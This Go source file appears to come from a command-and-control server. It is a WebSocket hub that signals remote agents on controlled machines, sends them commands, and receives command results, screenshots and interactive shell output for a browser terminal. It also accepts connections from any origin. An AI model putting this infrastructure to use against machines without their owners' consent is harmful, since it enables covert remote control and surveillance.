package channels

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"

	"c2/internal/command"
	"c2/internal/screenshot"
	userws "c2/internal/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type tokenEntry struct {
	ClientID uint
	Expires  time.Time
}

// agentConn 每条 Agent WS 独立写锁，满足 gorilla/websocket「同一连接同时仅一个写者」。
type agentConn struct {
	conn *websocket.Conn
	wmu  sync.Mutex
}

// Hub 管理 Agent 与平台的 WebSocket 数据通道（业务命令走 WS；TCP 仅心跳/隧道等）。
type Hub struct {
	mu     sync.RWMutex
	agents map[uint]*agentConn
	tokens map[string]*tokenEntry
	cmdMgr *command.Manager
	db     *gorm.DB
	// userHub 浏览器侧 WebSocket，用于把 Agent 上报的 shell 输出推给前端终端
	userHub *userws.Hub
}

func NewHub(db *gorm.DB, cm *command.Manager, userHub *userws.Hub) *Hub {
	return &Hub{
		agents:  make(map[uint]*agentConn),
		tokens:  make(map[string]*tokenEntry),
		cmdMgr:  cm,
		db:      db,
		userHub: userHub,
	}
}

// IssueToken 为 Signal 生成一次性令牌。
func (h *Hub) IssueToken(clientID uint) string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	tok := hex.EncodeToString(b)
	h.mu.Lock()
	h.tokens[tok] = &tokenEntry{ClientID: clientID, Expires: time.Now().Add(3 * time.Minute)}
	h.mu.Unlock()
	return tok
}

func (h *Hub) consumeToken(tok string) (uint, bool) {
	h.mu.Lock()
	defer h.mu.Unlock()
	e, ok := h.tokens[tok]
	if !ok || time.Now().After(e.Expires) {
		return 0, false
	}
	delete(h.tokens, tok)
	return e.ClientID, true
}

// AgentConnected 是否已有 Agent WebSocket。
func (h *Hub) AgentConnected(clientID uint) bool {
	h.mu.RLock()
	defer h.mu.RUnlock()
	ac, ok := h.agents[clientID]
	return ok && ac != nil && ac.conn != nil
}

// CloseAgent 关闭指定客户端的 Agent WebSocket（删除记录等场景）。
func (h *Hub) CloseAgent(clientID uint) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if ac, ok := h.agents[clientID]; ok && ac != nil {
		ac.wmu.Lock()
		if ac.conn != nil {
			_ = ac.conn.Close()
		}
		ac.wmu.Unlock()
		delete(h.agents, clientID)
	}
}

// EnsureAgentWSWait 下发 open_ws 后最多等待 wait 时长；已连接则立即返回 nil。
func (h *Hub) EnsureAgentWSWait(clientID uint, requestHost string, sendSignal func(map[string]interface{}) error, wait time.Duration) error {
	if h.AgentConnected(clientID) {
		return nil
	}
	host, port := splitHostPort(requestHost)
	tok := h.IssueToken(clientID)
	sig := map[string]interface{}{
		"action":   "open_ws",
		"token":    tok,
		"web_host": host,
		"web_port": port,
	}
	log.Printf("[cmd-trace] EnsureAgentWSWait(%v): client_id=%d web_host=%q web_port=%q token_prefix=%.8s…",
		wait, clientID, host, port, tok)
	if err := sendSignal(sig); err != nil {
		return err
	}
	deadline := time.Now().Add(wait)
	var nextLog time.Time
	if wait >= 5*time.Second {
		nextLog = time.Now().Add(5 * time.Second)
	}
	for time.Now().Before(deadline) {
		if h.AgentConnected(clientID) {
			log.Printf("[cmd-trace] EnsureAgentWSWait: client_id=%d 已连上 WS", clientID)
			return nil
		}
		if !nextLog.IsZero() && time.Now().After(nextLog) {
			log.Printf("[cmd-trace] EnsureAgentWSWait: 仍在等待 client_id=%d 的 /ws/agent …", clientID)
			nextLog = time.Now().Add(5 * time.Second)
		}
		time.Sleep(50 * time.Millisecond)
	}
	return fmt.Errorf("等待 Agent WebSocket 超时(%v)", wait)
}

// EnsureAgentWS 若未连接则通过 TCP 下发 signal，并等待 Agent 连上 WS（最长 20s）。
func (h *Hub) EnsureAgentWS(clientID uint, requestHost string, sendSignal func(map[string]interface{}) error) error {
	if h.AgentConnected(clientID) {
		log.Printf("[cmd-trace] EnsureAgentWS: client_id=%d 已有 WS，跳过 signal", clientID)
		return nil
	}
	err := h.EnsureAgentWSWait(clientID, requestHost, sendSignal, 20*time.Second)
	if err != nil {
		log.Printf("[cmd-trace] EnsureAgentWS: client_id=%d 结束: %v", clientID, err)
		return fmt.Errorf("等待 Agent WebSocket 超时，请确认客户端已更新且可访问 Web 服务端口")
	}
	return nil
}

// ForceReconnectAgentWS 关闭已有 /ws/agent，再让被控端重新握手新连接。
// 用于每次「连接」终端：避免复用同一条僵死或状态错乱的业务 WebSocket（否则易出现 session 建了但无 shell 输出）。
func (h *Hub) ForceReconnectAgentWS(clientID uint, requestHost string, sendSignal func(map[string]interface{}) error) error {
	log.Printf("[cmd-trace] ForceReconnectAgentWS: client_id=%d 关闭旧 Agent WS 后重新 open_ws", clientID)
	h.CloseAgent(clientID)
	time.Sleep(350 * time.Millisecond)
	err := h.EnsureAgentWSWait(clientID, requestHost, sendSignal, 20*time.Second)
	if err != nil {
		log.Printf("[cmd-trace] ForceReconnectAgentWS: client_id=%d err=%v", clientID, err)
		return fmt.Errorf("等待 Agent WebSocket 超时，请确认客户端已更新且可访问 Web 服务端口")
	}
	return nil
}

// SendAgentJSON 向 Agent 下发一条文本帧。
func (h *Hub) SendAgentJSON(clientID uint, payload []byte) error {
	h.mu.RLock()
	ac, ok := h.agents[clientID]
	h.mu.RUnlock()
	if !ok || ac == nil || ac.conn == nil {
		return fmt.Errorf("agent WebSocket 未连接")
	}
	snip := string(payload)
	if len(snip) > 200 {
		snip = snip[:200] + fmt.Sprintf("...(+%dB)", len(payload)-200)
	}
	log.Printf("[trace] 2/5 backend->Agent [/ws/agent] WriteMessage client_id=%d bytes=%d snip=%q", clientID, len(payload), snip)
	log.Printf("[bp-file] hub SendAgentJSON WRITE client_id=%d bytes=%d", clientID, len(payload))
	ac.wmu.Lock()
	defer ac.wmu.Unlock()
	err := ac.conn.WriteMessage(websocket.TextMessage, payload)
	if err != nil {
		log.Printf("[bp-file] hub SendAgentJSON WRITE ERR client_id=%d err=%v", clientID, err)
	} else {
		log.Printf("[bp-file] hub SendAgentJSON WRITE OK client_id=%d", clientID)
	}
	return err
}

// HandleAgentWS GET /ws/agent?token=...
func (h *Hub) HandleAgentWS(c *gin.Context) {
	tok := c.Query("token")
	if tok == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing token"})
		return
	}
	clientID, ok := h.consumeToken(tok)
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid or expired token"})
		return
	}
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Printf("[channels] agent ws upgrade: %v", err)
		return
	}
	h.mu.Lock()
	if old, exists := h.agents[clientID]; exists && old != nil && old.conn != nil {
		old.wmu.Lock()
		_ = old.conn.Close()
		old.wmu.Unlock()
	}
	h.agents[clientID] = &agentConn{conn: conn}
	h.mu.Unlock()
	log.Printf("[cmd-trace] /ws/agent 升级成功 client_id=%d（业务通道就绪）", clientID)
	go h.agentReadLoop(clientID, conn)
}

func (h *Hub) agentReadLoop(clientID uint, conn *websocket.Conn) {
	defer func() {
		h.mu.Lock()
		if ac, ok := h.agents[clientID]; ok && ac != nil && ac.conn == conn {
			delete(h.agents, clientID)
		}
		h.mu.Unlock()
		_ = conn.Close()
		log.Printf("[channels] agent WebSocket 已断开 client_id=%d", clientID)
	}()
	conn.SetReadLimit(32 << 20)
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[bp-file] hub agentReadLoop ReadMessage END client_id=%d err=%v", clientID, err)
			return
		}
		log.Printf("[bp-file] hub agentReadLoop RECV client_id=%d bytes=%d", clientID, len(msg))
		var base struct {
			Type string `json:"type"`
		}
		if err := json.Unmarshal(msg, &base); err != nil {
			log.Printf("[bp-file] hub agentReadLoop JSON base parse skip err=%v", err)
			continue
		}
		log.Printf("[bp-file] hub agentReadLoop MSG type=%s client_id=%d", base.Type, clientID)
		switch base.Type {
		case "command_response":
			var raw struct {
				CommandID string      `json:"command_id"`
				Result    string      `json:"result"`
				Success   interface{} `json:"success"`
			}
			_ = json.Unmarshal(msg, &raw)
			ok := parseSuccess(raw.Success)
			preview := raw.Result
			if len(preview) > 160 {
				preview = preview[:160] + fmt.Sprintf("...(+%dB)", len(raw.Result)-160)
			}
			log.Printf("[trace] 3/5 Agent[WS]->backend command_response client_id=%d cmd_id=%s success=%v result_len=%d preview=%q",
				clientID, raw.CommandID, ok, len(raw.Result), preview)
			log.Printf("[bp-file] hub command_response parsed client_id=%d cmd_id=%q success=%v result_len=%d", clientID, raw.CommandID, ok, len(raw.Result))
			if raw.CommandID == "" {
				log.Printf("[bp-file] hub command_response MISSING command_id client_id=%d", clientID)
			} else if h.cmdMgr != nil {
				log.Printf("[bp-file] hub CompleteCommand CALL cmd_id=%s", raw.CommandID)
				if err := h.cmdMgr.CompleteCommand(raw.CommandID, raw.Result, ok); err != nil {
					log.Printf("[bp-file] hub CompleteCommand ERR cmd_id=%s err=%v", raw.CommandID, err)
				} else {
					log.Printf("[bp-file] hub CompleteCommand OK cmd_id=%s", raw.CommandID)
					log.Printf("[autostart-trace] WS command_response 已入库 client_id=%d cmd_id=%s success=%v result_len=%d",
						clientID, raw.CommandID, ok, len(raw.Result))
				}
			}
		case "screenshot":
			var m map[string]interface{}
			if err := json.Unmarshal(msg, &m); err != nil {
				continue
			}
			ds, _ := m["data"].(string)
			data, err := base64.StdEncoding.DecodeString(ds)
			if err != nil {
				continue
			}
			w := parseIntAny(m["width"])
			hh := parseIntAny(m["height"])
			format := "png"
			if f, ok := m["format"].(string); ok && f != "" {
				format = f
			}
			sm := screenshot.NewManager(h.db)
			cmdID, _ := m["id"].(string)
			if _, err := sm.SaveScreenshot(clientID, w, hh, format, data); err != nil {
				if cmdID != "" && h.cmdMgr != nil {
					h.cmdMgr.CompleteCommandOrLog(cmdID, "screenshot save failed: "+err.Error(), false)
				}
				continue
			}
			if cmdID != "" && h.cmdMgr != nil {
				h.cmdMgr.CompleteCommandOrLog(cmdID, "ok", true)
			}

		case "shell_output":
			var so struct {
				SessionID string `json:"session_id"`
				Data      string `json:"data"`
			}
			if err := json.Unmarshal(msg, &so); err != nil {
				continue
			}
			dp := so.Data
			if len(dp) > 120 {
				dp = dp[:120] + fmt.Sprintf("...(+%dB)", len(so.Data)-120)
			}
			log.Printf("[trace] 3/5 Agent[WS]->backend shell_output client_id=%d session_id=%s data_len=%d preview=%q -> browser /ws",
				clientID, so.SessionID, len(so.Data), dp)
			if h.userHub != nil {
				h.userHub.BroadcastShellOutput(clientID, so.SessionID, so.Data)
			}
		default:
			log.Printf("[trace] Agent[WS]->backend client_id=%d type=%s msg_bytes=%d", clientID, base.Type, len(msg))
		}
	}
}

func parseIntAny(v interface{}) int {
	switch t := v.(type) {
	case float64:
		return int(t)
	case string:
		n, _ := strconv.Atoi(t)
		return n
	default:
		return 0
	}
}

func parseSuccess(v interface{}) bool {
	switch t := v.(type) {
	case bool:
		return t
	case string:
		return t == "true" || t == "1"
	case float64:
		return t != 0
	default:
		return false
	}
}

func splitHostPort(hostport string) (host, port string) {
	// c.Request.Host 形如 127.0.0.1:8080
	if hostport == "" {
		return "127.0.0.1", "8080"
	}
	for i := len(hostport) - 1; i >= 0; i-- {
		if hostport[i] == ':' {
			return hostport[:i], hostport[i+1:]
		}
	}
	return hostport, "80"
}
